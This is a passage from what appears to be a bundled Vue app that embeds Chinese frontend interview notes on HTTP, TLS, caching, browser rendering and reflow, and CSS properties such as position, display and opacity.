get和post虽然本质都是tcp/ip，但两者除了在http层面外，在tcp/ip层面也有区别。\r\n```\r\n\r\nget会产生一个tcp数据包，post两个\r\n\r\n```\r\n\t\t- get请求时，浏览器会把headers和data一起发送出去，服务器响应200（返回数据），\r\n\t\t- post请求时，浏览器先发送headers，服务器响应100 continue，\r\n\t\t- 浏览器再发送data，服务器响应200（返回数据）。\r\n```\r\n\r\n- 五层因特网协议栈\r\n  - 一个概念： 从客户端发出http请求到服务器接收，中间会经过一系列的流程。\r\n    - 从应用层的发送http请求，到传输层通过三次握手建立tcp/ip连接，再到网络层的ip寻址，再到数据链路层的封装成帧，最后到物理层的利用物理介质传输。\r\n\r\n当然，服务端的接收就是反过来的步骤\r\n\r\n```\r\n- 1.应用层(dns,http) DNS解析成IP并发送http请求\r\n```\r\n\r\n2.传输层(tcp,udp) 建立tcp连接（三次握手）\r\n\r\n3.网络层(IP,ARP) IP寻址\r\n\r\n4.数据链路层(PPP) 封装成帧\r\n\r\n5.物理层(利用物理介质传输比特流) 物理传输（然后传输的时候通过双绞线，电磁波等各种介质）\r\n\r\n### 从服务器接收到请求到对应后台接收到请求\r\n\r\n- 负载均衡\r\n  - 用户发起的请求都指向调度服务器（反向代理服务器，譬如安装了nginx控制负载均衡），\r\n    然后调度服务器根据实际的调度算法，分配不同的请求给对应集群中的服务器执行，然后调度器等待实际服务器的HTTP响应，并将它反馈给用户\r\n- 后台的处理\r\n  - 一般后台都是部署到容器中的，所以一般为：\r\n    - 先是容器接受到请求（如tomcat容器）\r\n    - 然后对应容器中的后台程序接收到请求（如java程序）\r\n    - 然后就是后台会有自己的统一处理，处理完后响应响应结果\r\n  - 概括下：\r\n    - 一般有的后端是有统一的验证的，如安全拦截，跨域验证\r\n    - 如果这一步不符合规则，就直接返回了相应的http报文（如拒绝请求等）\r\n    - 然后当验证通过后，才会进入实际的后台代码，此时是程序接收到请求，然后执行（譬如查询数据库，大量计算等等）\r\n    - 等程序执行完毕后，就会返回一个http响应包（一般这一步也会经过多层封装）\r\n    - 然后就是将这个包从后端发送到前端，完成交互\r\n- 后台和前台的http交互\r\n  - http报文结构\r\n    - 报文一般包括了：通用头部，请求/响应头部，请求/响应体\r\n      - 通用头部\r\n        - 这也是开发人员见过的最多的信息，包括如下：\r\n          - Request Url: 请求的web服务器地址\r\n          - Request Method: 请求方式（Get、POST、OPTIONS、PUT、HEAD、DELETE、CONNECT、TRACE）\r\n            - HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。\r\n            - HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。\r\n          - Status Code: 请求的返回状态码，如200代表成功\r\n            - 200——表明该请求被成功地完成，所请求的资源发送回客户端\r\n            - 304——自从上次请求后，请求的网页未修改过，请客户端使用本地缓存\r\n            - 400——客户端请求有错（譬如可以是安全模块拦截）\r\n            - 401——请求未经授权\r\n            - 403——禁止访问（譬如可以是未登录时禁止）\r\n            - 404——资源未找到\r\n            - 500——服务器内部错误\r\n            - 503——服务不可用\r\n            - 1xx——指示信息，表示请求已接收，继续处理\r\n            - 2xx——成功，表示请求已被成功接收、理解、接受\r\n            - 3xx——重定向，要完成请求必须进行更进一步的操作\r\n            - 4xx——客户端错误，请求有语法错误或请求无法实现\r\n            - 5xx——服务器端错误，服务器未能实现合法的请求\r\n          - Remote Address: 请求的远程服务器地址（会转为IP）\r\n      - 请求/响应头部\r\n        - 常用的请求头部（部分）：\r\n          - Accept: 接收类型，表示浏览器支持的MIME类型\r\n            （对标服务端返回的Content-Type）\r\n            Accept-Encoding：浏览器支持的压缩类型,如gzip等,超出类型不能接收\r\n            Content-Type：客户端发送出去实体内容的类型\r\n            Cache-Control: 指定请求和响应遵循的缓存机制，如no-cache\r\n            If-Modified-Since：对应服务端的Last-Modified，用来匹配看文件是否变动，只能精确到1s之内，http1.0中\r\n            Expires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间\r\n            Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中\r\n            If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中\r\n            Cookie: 有cookie并且同域访问时会自动带上\r\n            Connection: 当浏览器与服务器通信时对于长连接如何进行处理,如keep-alive\r\n            Host：请求的服务器URL\r\n            Origin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私\r\n            Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)\r\n            User-Agent：用户客户端的一些必要信息，如UA头部等\r\n        - 常用的响应头部（部分）：\r\n          - Access-Control-Allow-Headers: 服务器端允许的请求Headers\r\n            Access-Control-Allow-Methods: 服务器端允许的请求方法\r\n            Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）\r\n            Content-Type：服务端返回的实体内容的类型\r\n            Date：数据从服务器发送的时间\r\n            Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档\r\n            Last-Modified：请求资源的最后修改时间\r\n            Expires：应该在什么时候认为文档已经过期,从而不再缓存它\r\n            Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效\r\n            ETag：请求变量的实体标签的当前值\r\n            Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端\r\n            Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）\r\n            Server：服务器的一些相关信息\r\n      - 请求/响应实体\r\n        - http请求时，除了头部，还有消息实体，一般来说\r\n\r\n请求实体中会将一些需要的参数都放入进入（用于post请求）。\r\n\r\n譬如实体中可以放参数的序列化形式（a=1&b=2这种），或者直接放表单对象（Form Data对象，上传时可以夹杂参数以及文件），等等\r\n\r\n而一般响应实体中，就是放服务端需要传给客户端的内容\r\n\r\n一般现在的接口请求时，实体中就是对于的信息的json格式，而像页面请求这种，里面就是直接放了一个html字符串，然后浏览器自己解析并渲染。\r\n\r\n```\r\n\t\t- CRLF\r\n\r\n\t\t\t- CRLF（Carriage-Return Line-Feed），意思是回车换行，一般作为分隔符存在\r\n```\r\n\r\n请求头和实体消息之间有一个CRLF分隔，响应头部和响应实体之间用一个CRLF分隔\r\n\r\n一般来说（分隔符类别）：\r\n\r\nCRLF->Windows-style\r\nLF->Unix Style\r\nCR->Mac Style\r\n\r\n- cookie以及优化\r\n  - cookie是浏览器的一种本地存储方式，一般用来帮助客户端和服务端通信的，常用来进行身份校验，结合服务端的session使用。\r\n    - 场景如下（简述）：\r\n      - 在登陆页面，用户登陆了\r\n\r\n此时，服务端会生成一个session，session中有对于用户的信息（如用户名、密码等）\r\n\r\n然后会有一个sessionid（相当于是服务端的这个session对应的key）\r\n\r\n然后服务端在登录页面中写入cookie，值就是:jsessionid=xxx\r\n\r\n然后浏览器本地就有这个cookie了，以后访问同域名下的页面时，自动带上cookie，自动检验，在有效时间内无需二次登陆。\r\n\r\n- gzip压缩\r\n  - 首先，明确gzip是一种压缩格式，需要浏览器支持才有效（不过一般现在浏览器都支持），\r\n    而且gzip压缩效率很好（高达70%左右）\r\n\r\n然后gzip一般是由apache、tomcat等web服务器开启\r\n\r\n当然服务器除了gzip外，也还会有其它压缩格式（如deflate，没有gzip高效，且不流行）\r\n\r\n所以一般只需要在服务器上开启了gzip压缩，然后之后的请求就都是基于gzip压缩格式的，\r\n非常方便。\r\n\r\n- 长连接与短连接\r\n\r\n  - 首先看tcp/ip层面的定义：\r\n    - 长连接：一个tcp/ip连接上可以连续发送多个数据包，在tcp连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包）\r\n    - 短连接：通信双方有数据交互时，就建立一个tcp连接，数据发送完成后，则断开此tcp连接\r\n  - 然后在http层面：\r\n    - http1.0中，默认使用的是短连接，也就是说，浏览器没进行一次http操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接\r\n    - http1.1起，默认使用长连接，使用长连接会有这一行Connection: keep-alive，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输http的tcp连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接\r\n  - keep-alive不会永远保持，它有一个持续时间，一般在服务器中配置（如apache），另外长连接需要客户端和服务器都支持时才有效\r\n\r\n- http 2.0\r\n\r\n  - http2.0不是https，它相当于是http的下一代规范（譬如https的请求可以是http2.0规范的）\r\n  - 然后简述下http2.0与http1.1的显著不同点：\r\n    - http1.1中，每请求一个资源，都是需要开启一个tcp/ip连接的，所以对应的结果是，每一个资源对应一个tcp/ip请求，由于tcp/ip本身有并发数限制，所以当资源一多，速度就显著慢下来\r\n    - http2.0中，一个tcp/ip请求可以请求多个资源，也就是说，只要一次tcp/ip请求，就可以请求若干个资源，分割成更小的帧请求，速度明显提升。\r\n  - http2.0的一些特性：\r\n    - 多路复用（即一个tcp/ip连接可以请求多个资源）\r\n    - 首部压缩（http头部压缩，减少体积）\r\n    - 二进制分帧（在应用层跟传送层之间增加了一个二进制分帧层，改进传输性能，实现低延迟和高吞吐量）\r\n    - 服务器端推送（服务端可以对客户端的一个请求发出多个响应，可以主动通知客户端）\r\n    - 请求优先级（如果流被赋予了优先级，它就会基于这个优先级来处理，由服务器决定需要多少资源来处理该请求。）\r\n\r\n- https\r\n\r\n  - https就是安全版本的http，譬如一些支付等操作基本都是基于https的，因为http请求的安全系数太低了。\r\n\r\n    - 简单来看，https与http的区别就是： 在请求前，会建立ssl链接，确保接下来的通信都是加密的，无法被轻易截取分析\r\n\r\n  - SSL/TLS的握手流程，如下（简述）：\r\n\r\n    - 1. 浏览器请求建立SSL链接，并向服务端发送一个随机数–Client random和客户端支持的加密方法，比如RSA加密，此时是明文传输。\r\n\r\n    - 1. 服务端从中选出一组加密算法与Hash算法，回复一个随机数–Server random，并将自己的身份信息以证书的形式发回给浏览器\r\n         （证书里包含了网站地址，非对称加密的公钥，以及证书颁发机构等信息）\r\n\r\n    - 1. 浏览器收到服务端的证书后\r\n\r\n      - - 验证证书的合法性（颁发机构是否合法，证书中包含的网址是否和正在访问的一样），如果证书信任，则浏览器会显示一个小锁头，否则会有提示\r\n\r\n      - ```\r\n        - 用户接收证书后（不管信不信任），浏览会生产新的随机数–Premaster secret，然后证书中的公钥以及指定的加密方法加密`Premaster secret`，发送给服务器。\r\n        ```\r\n\r\n      - ```\r\n        - 利用Client random、Server random和Premaster secret通过一定的算法生成HTTP链接数据传输的对称加密key-`session key`\r\n        ```\r\n\r\n      - ```\r\n        - 使用约定好的HASH算法计算握手消息，并使用生成的`session key`对消息进行加密，最后将之前生成的所有信息发送给服务端。\r\n        ```\r\n\r\n    - 1. 服务端收到浏览器的回复\r\n\r\n      - - 利用已知的加解密方式与自己的私钥进行解密，获取`Premaster secret`\r\n\r\n      - ```\r\n        - 和浏览器相同规则生成`session key`\r\n        ```\r\n\r\n      - ```\r\n        - 使用`session key`解密浏览器发来的握手消息，并验证Hash是否与浏览器发来的一致\r\n        ```\r\n\r\n      - ```\r\n        - 使用`session key`加密一段握手消息，发送给浏览器\r\n        ```\r\n\r\n    - 1. 浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，\r\n\r\n- 单独拎出来的缓存问题，http的缓存\r\n\r\n  - 强缓存与弱缓存\r\n    - 缓存可以简单的划分成两种类型：强缓存（200 from cache）与协商缓存（304）\r\n      - 区别简述如下：\r\n        - 强缓存（200 from cache）时，浏览器如果判断本地缓存未过期，就直接使用，无需发起http请求\r\n          - 但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改了路径相当于是另一个资源了，这也是前端工程化中常用到的技巧）\r\n        - 协商缓存（304）时，浏览器会向服务端发起http请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存\r\n          - 对于协商缓存，使用Ctrl + F5强制刷新可以使得缓存无效\r\n  - 缓存头部简述\r\n    - 属于强缓存控制的：\r\n      - （http1.1）Cache-Control/Max-Age\r\n      - （http1.0）Pragma/Expires\r\n    - 属于协商缓存控制的：\r\n      - （http1.1）If-None-Match/E-tag\r\n      - （http1.0）If-Modified-Since/Last-Modified\r\n    - 头部的区别\r\n      - http1.0中的缓存控制：\r\n        - Pragma：严格来说，它不属于专门的缓存控制头部，但是它设置no-cache时可以让本地强缓存失效（属于编译控制，来实现特定的指令，主要是因为兼容http1.0，所以以前又被大量应用）\r\n        - Expires：服务端配置的，属于强缓存，用来控制在规定的时间之前，浏览器不会发出请求，而是直接使用本地缓存，注意，Expires一般对应服务器端时间，如Expires：Fri, 30 Oct 1998 14:19:41\r\n        - If-Modified-Since/Last-Modified：这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是If-Modified-Since，而服务端的是Last-Modified，它的作用是，在发起请求时，如果If-Modified-Since和Last-Modified匹配，那么代表服务器资源并未改变，因此服务端不会返回资源实体，而是只返回头部，通知浏览器可以使用本地缓存。Last-Modified，顾名思义，指的是文件最后的修改时间，而且只能精确到1s以内\r\n      - http1.1中的缓存控制：\r\n        - Cache-Control：缓存控制头部，有no-cache、max-age等多种取值\r\n        - Max-Age：服务端配置的，用来控制强缓存，在规定的时间之内，浏览器无需发出请求，直接使用本地缓存，注意，Max-Age是Cache-Control头部的值，不是独立的头部，譬如Cache-Control: max-age=3600，而且它值得是绝对时间，由浏览器自己计算\r\n        - If-None-Match/E-tag：这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是If-None-Match，而服务端的是E-tag，同样，发出请求后，如果If-None-Match和E-tag匹配，则代表内容未变，通知浏览器使用本地缓存，和Last-Modified不同，E-tag更精确，它是类似于指纹一样的东西，基于FileEtag INode Mtime Size生成，也就是说，只要文件变，指纹就会变，而且没有1s精确度的限制。\r\n      - Max-Age相比Expires？\r\n        - Expires使用的是服务器端的时间\r\n          - 客户端时间和服务端不同步\r\n\r\n那这样，可能就会出问题了，造成了浏览器本地的缓存无用或者一直无法过期\r\n\r\n所以一般http1.1后不推荐使用Expires\r\n\r\n```\r\n\t\t\t- 而Max-Age使用的是客户端本地时间的计算，因此不会有这个问题\r\n\t\t\t- 注意，如果同时启用了Cache-Control与Expires，Cache-Control优先级高。\r\n\r\n\t\t- E-tag相比Last-Modified？\r\n\r\n\t\t\t- Last-Modified：\r\n\r\n\t\t\t\t- 表明服务端的文件最后何时改变的\r\n\t\t\t\t- 它有一个缺陷就是只能精确到1s，\r\n\t\t\t\t- 然后还有一个问题就是有的服务端的文件会周期性的改变，导致缓存失效\r\n\r\n\t\t\t- E-tag：\r\n\r\n\t\t\t\t- 是一种指纹机制，代表文件相关指纹\r\n\t\t\t\t- 只有文件变才会变，也只要文件变就会变，\r\n\t\t\t\t- 也没有精确时间的限制，只要文件一遍，立马E-tag就不一样了\r\n\r\n\t\t\t- 如果同时带有E-tag和Last-Modified，服务端会优先检查E-tag\r\n```\r\n\r\n### 解析页面流程\r\n\r\n- 流程简述\r\n\r\n  - 浏览器内核拿到内容后，渲染步骤大致可以分为以下几步：\r\n\r\n    - 1. 解析HTML，构建DOM树\r\n\r\n      - 解析HTML到构建出DOM当然过程可以简述如下：\r\n        - Bytes → characters → tokens → nodes → DOM\r\n          - 譬如假设有这样一个HTML页面：\r\n            - \r\n            - 列举其中的一些重点过程：\r\n              - 1. Conversion转换：浏览器将获得的HTML内容（Bytes）基于他的编码转换为单个字符\r\n              - 1. Tokenizing分词：浏览器按照HTML规范标准将这些字符转换为不同的标记token。每个token都有自己独特的含义以及规则集\r\n              - 1. Lexing词法分析：分词的结果是得到一堆的token，此时把他们转换为对象，这些对象分别定义他们的属性和规则\r\n              - 1. DOM构建：因为HTML标记定义的就是不同标签之间的关系，这个关系就像是一个树形结构一样\r\n              - 例如：body对象的父节点就是HTML对象，然后段略p对象的父节点就是body对象\r\n            - 最后的DOM树如下：\r\n\r\n    - 1. 解析CSS，生成CSS规则树\r\n\r\n      - CSS规则树的生成也是类似。简述为：\r\n        - Bytes → characters → tokens → nodes → CSSOM\r\n          - style.css内容如下：\r\n            - body { font-size: 16px }\r\n              p { font-weight: bold }\r\n              span { color: red }\r\n              p span { display: none }\r\n              img { float: right }\r\n              - 最终的CSSOM树就是：\r\n\r\n    - 1. 合并DOM树和CSS规则，生成render树\r\n\r\n      - 当DOM树和CSSOM都有了后，就要开始构建渲染树了\r\n\r\n一般来说，渲染树和DOM树相对应的，但不是严格意义上的一一对应\r\n\r\n因为有一些不可见的DOM元素不会插入到渲染树中，如head这种不可见的标签或者display: none等\r\n\r\n```\r\n\t- 4. 布局render树（Layout/reflow），负责各元素尺寸、位置的计算\r\n\r\n\t\t- 有了render树，接下来就是开始渲染，基本流程如下：\r\n\r\n\t\t\t- 重要的四个步骤就是：\r\n\r\n\t\t\t\t- 1. 计算CSS样式\r\n\t\t\t\t- 2. 构建渲染树\r\n\t\t\t\t- 3. 布局，主要定位坐标和大小，是否换行，各种position overflow z-index属性\r\n\t\t\t\t- 4. 绘制，将图像绘制出来\r\n\r\n\t\t\t- 图中的线与箭头代表通过js动态修改了DOM或CSS，导致了重新布局（Layout）或渲染（Repaint）\r\n\t\t\t- Layout和Repaint的概念是有区别的：\r\n\r\n\t\t\t\t- Layout，也称为Reflow，即回流。一般意味着元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树\r\n\t\t\t\t- Repaint，即重绘。意味着元素发生的改变只是影响了元素的一些外观之类的时候（例如，背景色，边框颜色，文字颜色等），此时只需要应用新样式绘制这个元素就可以了\r\n\r\n\t\t\t- 什么会引起回流？\r\n\r\n\t\t\t\t- 1.页面渲染初始化\r\n\t\t\t\t- 2.DOM结构改变，比如删除了某个节点\r\n\t\t\t\t- 3.render树变化，比如减少了padding\r\n\t\t\t\t- 4.窗口resize\r\n\t\t\t\t- 5.最复杂的一种：获取某些属性，引发回流，\r\n```\r\n\r\n很多浏览器会对回流做优化，会等到数量足够时做一次批处理回流，\r\n但是除了render树的直接变化，当获取一些属性时，浏览器为了获得正确的值也会触发回流，这样使得浏览器优化无效，包括\r\n\r\n```\r\n\t\t\t\t\t-     （1）offset(Top/Left/Width/Height)\r\n\t\t\t\t\t-      (2) scroll(Top/Left/Width/Height)\r\n\t\t\t\t\t-      (3) cilent(Top/Left/Width/Height)\r\n\t\t\t\t\t-      (4) width,height\r\n\t\t\t\t\t-      (5) 调用了getComputedStyle()或者IE的currentStyle\r\n\r\n\t\t\t- 回流优化方案\r\n\r\n\t\t\t\t- 减少逐项更改样式，最好一次性更改style，或者将样式定义为class并一次性更新\r\n\t\t\t\t- 避免循环操作dom，创建一个documentFragment或div，在它上面应用所有DOM操作，最后再把它添加到window.document\r\n\t\t\t\t- 避免多次读取offset等属性。无法避免则将它们缓存到变量\r\n\t\t\t\t- 将复杂的元素绝对定位或固定定位，使得它脱离文档流，否则回流代价会很高\r\n\r\n\t- 5. 绘制render树（paint），绘制页面像素信息\r\n\t- 6. 浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上\r\n```",Sn={data:function(){return{MainComponent:hn}}},yn=Sn,fn=Object(u["a"])(yn,bn,vn,!1,null,"ea8ae612",null),_n=fn.exports,xn=t("1b62"),wn={mixins:[xn["a"]],components:{m1:d,m2:f,m3:C,m4:A,m5:H,m7:$,m8:Z,m9:on,m10:gn,m11:_n},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"基本",value:"m1"},{label:"存储",value:"m2"},{label:"渲染原理",value:"m3"},{label:"渲染原理2",value:"m11"},{label:"重排和重绘 ",value:"m7"},{label:"跨域",value:"m8"},{label:"bom",value:"m9"},{label:"dom",value:"m10"}]}}},En=wn,Tn=Object(u["a"])(En,i,s,!1,null,"5e2cbb52",null),kn=Tn.exports,Cn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},jn=[],Mn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Rn=[],Ln="#### 分析比较opacity:0、visibility:hidden、display:none的区别、优劣及适用场景\r\n\r\n------\r\n\r\n#### 三个属性分别是什么？\r\n\r\n1. #### opacity （filter: alpha（opacity = 0-100））– [MDN详细讲解](https://developer.mozilla.org/zh-CN/docs/Web/CSS/opacity)\r\n\r\n   1. 定义：指定了一个元素的透明度\r\n   2. 值：number类型的值，0~1，如果超过范围，则按最接近的范围值展示，如值为999的时候，是按1展示。默认为1，同样，值为-999时，是按0展示\r\n   3. 兼容性：很好。除了IE9之前（详细到各浏览器版本号就看文档\r\n   4. 关注点：什么是透明，是否还存在文档流中，对子元素影响呢？\r\n\r\n2. #### visibility – [MDN详细讲解](https://developer.mozilla.org/zh-CN/docs/Web/CSS/visibility)\r\n\r\n   1. 定义：显示或隐藏元素而不更改文档的布局。其中collapse值，还可以隐藏table中的行或列。\r\n   2. 值：关键值有三个，分别如下。\r\n      1. ___visible，默认值，正常展示\r\n      2. ___hidden，隐藏元素，不改变布局，但子元素如果设置为visibility: visible，则该子元素可见（很有意思的一个属性）\r\n      3. ___collapse，应用于table表格。\r\n   3. 兼容性：css2的属性，应该都能兼容吧（没Windows\r\n   4. 关注点：和opacity的透明度有什么区别？\r\n\r\n3. #### display – [MDN详细讲解](https://developer.mozilla.org/zh-CN/docs/Web/CSS/display#display_none)\r\n\r\n   1. 定义：指定了元素的显示类型，包含两类基础特征，**用于指定元素怎样生成盒模型。****外部显示类型**定义了元素怎么参与流式布局的处理。**内部显示类型**定义了子元素的布局方式， 详细可以看看[语法部分](http://localhost:18080/[https://developer.mozilla.org/zh-CN/docs/Web/CSS/display#语法](https://developer.mozilla.org/zh-CN/docs/Web/CSS/display#语法))\r\n   2. 值：很多值，其中 none 属于 display-box。被设置成none的元素，将从可访问性树中移除，包括其子元素在内。\r\n   3. 兼容性：基本支持\r\n   4. 关注点：对页面重绘有没性能影响？是否可与别的属性连用？\r\n\r\n4. #### 表格对比\r\n\r\n|                                    | opacity: 0 | visibility: hidden | display:none |\r\n| :--------------------------------: | :--------: | :----------------: | :----------: |\r\n|           是否存在页面中           |    存在    |        存在        |    不存在    |\r\n| 子元素设置该属性其他值是否还能展示 |   不可以   |        可以        |    不可以    |\r\n|      自身绑定的事件是否能触发      |     能     |        不能        |     不能     |\r\n|     是否影响遮挡元素的事件触发     |    影响    |       不影响       |    不影响    |\r\n|     改变属性值是否影响页面重绘     |   不一定   |        一定        |     一定     |\r\n|       改变属性值是否影响回流       |    不会    |         会         |      会      |\r\n|      该属性是否支持transition      |    支持    |        支持        |    不支持    |\r\n\r\n#### 三者的优劣和应用场景\r\n\r\n1. #### 绑定事件\r\n\r\n   1. opacity：从表格可得知，opacity的隐藏，只是透明度100%，看不见了，但还在页面中且可以通过z-index等方式遮挡其他元素，同时绑在在该元素上的事件依旧能触发。应用场景可以有：移动端使用input、select加div，自定义样式，其中input、select层级在div上面，并设置opacity为0\r\n   2. visibility：这个属性是隐藏，意味着不能聚焦了还占据页面空间。但其子元素可以设置属性值为visible，就能正常显示。应用场景：父元素隐藏，子元素根据一定条件某些展示某些隐藏。可以做一个闪闪发光的星空？\r\n   3. display none就不存在页面中了，可以理解为完全的消失。优点即应用场景，如果是流式布局，让一个元素隐藏且不占据空间，就使用这个属性值了。\r\n\r\n2. #### 性能方面\r\n\r\n   1. opacity由于只是透明度变化，就还好，visibility是元素隐藏，需要重绘，disable是元素消失，也是需要。\r\n   2. 应用方面，需要频繁切换状态时，在display和opacity中，可以选择后者，不频繁时，none也可以。\r\n",On={data:function(){return{MainComponent:Ln}}},An=On,In=Object(u["a"])(An,Mn,Rn,!1,null,"cbdfb03e",null),Dn=In.exports,Pn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Nn=[],qn='# css                                   \r\n## CSS属性\r\n### 定位\r\n- position\r\n\t- static                                                                                                                                               \r\n\t  static：\r\n\t  对象遵循常规流。此时4个定位偏移属性不会被                                                                                                                                                             应用。\r\n\t- relative\r\n\t  对象遵循常规流，并且参照自身在常规流中的位置通过top，right，bottom，left这4个定位偏移属性进行偏移时不会影响常规流中的任何元素。\r\n\t- absolute\r\n\t  对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。\r\n\t- fixed\r\n\t  fixed：\r\n\t  与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。\r\n\t- sticky\r\n\t  对象在常态时遵循常规流。它就像是relative和fixed的合体，当在屏幕中时按常规流排版，当卷动到屏幕外时则表现如fixed。该属性的表现是现实中你见到的吸附效果。（CSS3）\r\n- z-index\r\n\t- auto\r\n\t  元素在当前层叠上下文中的层叠级别是0。元素不会创建新的局部层叠上下文，除非它是根元素。\r\n\t- <integer>\r\n\t  用整数值来定义堆叠级别。可以为负值。\r\n### 布局\r\n- display\r\n\t- none\r\n\t  与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间\r\n\t- inline\r\n\t  内联元素\r\n\t- block\r\n\t  块元素\r\n\t- inline-block\r\n\t  内联块元素\r\n\t- .......\r\n- float\r\n  none | left | right\r\n  当一个元素是绝对定位元素或者定义了display为none时，float定义不生效。\r\n- clear\r\n  none(默认) | left | right | both\r\n- visibility\r\n  visible(默认) | hidden | collapse\r\n  collapse：\r\n  主要用来隐藏表格的行或列。隐藏的行或列能够被其他内容使用。对于表格外的其他对象，其作用等同于hidden。\r\n  定义了元素是否可见。\r\n  注意：与display属性不同，visibility会为隐藏的元素保留其占据的物理空间\r\n  如果希望某个元素为可见，其父元素也必须是可见的。\r\n- overflow\r\n  visible | hidden | scroll | auto | clip\r\n  适用范围：块容器，伸缩盒容器，grid容器\r\n  visible：\r\n  对溢出内容不做处理，内容可能会超出容器。\r\n  hidden：\r\n  隐藏溢出容器的内容且不出现滚动条。\r\n  scroll：\r\n  隐藏溢出容器的内容，溢出的内容可以通过滚动呈现。\r\n  auto：\r\n  当内容没有溢出容器时不出现滚动条，当内容溢出容器时出现滚动条，按需出现滚动条。textarea元素的overflow默认值就是auto。\r\n  clip：\r\n  与hidden一样，clip也被用来隐藏溢出容器的内容且不出现滚动条。不同的地方在于，clip是一个完全禁止滚动的容器，而hidden仍然可以通过编程机制让内容可以滚动。\r\n  注意：scroll 与 auto 的区别：scroll 无论溢出如否都存在滚动条\r\n### 尺寸与补白\r\n- width\r\n  <length> | <percentage> | auto(默认)\r\n  对于img元素来说，若仅指定此属性，其height值将会根据图片源尺寸进行等比例缩放。\r\n- height\r\n  定义了元素内容区（Content Area）的高度\r\n  对于img元素来说，若仅指定此属性，其width值将会根据图片源尺寸进行等比例缩放。\r\n- padding\r\n  padding：[ <length> | <percentage> ]{1,4}\r\n- margin\r\n  margin折叠常规认知：\r\n  margin折叠只发生在块级元素上；\r\n  浮动元素的margin不与任何margin发生折叠；\r\n  设置了属性overflow且值为非visible的块级元素，将不与它的子元素发生margin折叠；\r\n  绝对定位元素的margin不与任何margin发生折叠；\r\n  根元素的margin不与其它任何margin发生折叠；\r\n### 背景与边框\r\n- border\r\n\t- border\r\n\t  border：<line-width> || <line-style> || <color>\r\n\t- box-shadow\r\n\t  语法：\r\n\t  box-shadow：none | <shadow> [ , <shadow> ]*\r\n\t  <shadow> = inset? && <length>{2,4} && <color>?\r\n\t  none：\r\n\t  无阴影\r\n\t  <length>①：\r\n\t  第 1 个长度值定义元素的阴影水平偏移值。正值，阴影出现在元素右侧；负值，则阴影出现在元素左侧\r\n\t  <length>②：\r\n\t  第 2 个长度值定义元素的阴影垂直偏移值。正值，阴影出现在元素底部；负值，则阴影出现在元素顶部\r\n\t  <length>③：\r\n\t  第 3 个长度值定义元素的阴影模糊值半径（如果提供了）。该值越大阴影边缘越模糊，若该值为0，阴影边缘不出现模糊。不允许负值\r\n\t  <length>④：\r\n\t  第 4 个长度值定义元素的阴影外延值（如果提供了）。正值，阴影将向四面扩展；负值，则阴影向里收缩\r\n\t  <color>：\r\n\t  定义元素阴影的颜色。如果该值未定义，阴影颜色将默认取当前最近的文本颜色\r\n\t  inset：\r\n\t  定义元素的阴影类型为内阴影。该值为空时，则元素的阴影类型为外阴影\r\n\t- border-radius\r\n\t  语法：\r\n\t  border-radius：[ <length> | <percentage> ]{1,4} [ / [ <length> | <percentage> ]{1,4} ]?\r\n\t  border-radius属性提供 2 个参数，参数间以/分隔，每个参数允许设置 1~4 个参数值，第 1 个参数表示水平半径或半轴，第 2 个参数表示垂直半径或半轴，如第 2 个参数值省略未定义，则直接复制第 1 个参数值。\r\n\t  注意（对角原则）：水平半径或半轴：如果提供全部四个参数值，将按上左 top-left、上右 top-right、下右 bottom-right、下左 bottom-left的顺序作用于四个角；提供三个，第一个用于top-left，第二个用于top-right和bottom-left，第三个用于bottom-right；提供两个，第一个用于top-left和bottom-right，第二个用于top-right和bottom-left；只提供一个，将用于全部的四个角。\r\n- background\r\n\t- background\r\n\t- ......\r\n### 颜色与透明度\r\n- color\r\n- opacity\r\n### 字体\r\n- font\r\n- font-style\r\n  font-style：normal | italic | oblique\r\n  normal：\r\n  指定文本字体样式为正常的字体\r\n  italic：\r\n  指定文本字体样式为斜体。对于没有设计斜体的特殊字体，如果要使用斜体外观将应用oblique\r\n  oblique：\r\n  指定文本字体样式为倾斜的字体。人为的使文字倾斜，而不是去选取字体中的斜体字\r\n- font-weight\r\n  font-weight：normal | bold | bolder | lighter | <integer>\r\n  <integer>：\r\n  用数字表示文本字体粗细。取值范围：100 | 200 | 300 | 400 | 500 | 600 | 700 | 800 | 900\r\n- font-size\r\n- font-family\r\n  font-family：[ <family-name> | <generic-family> ] #\r\n  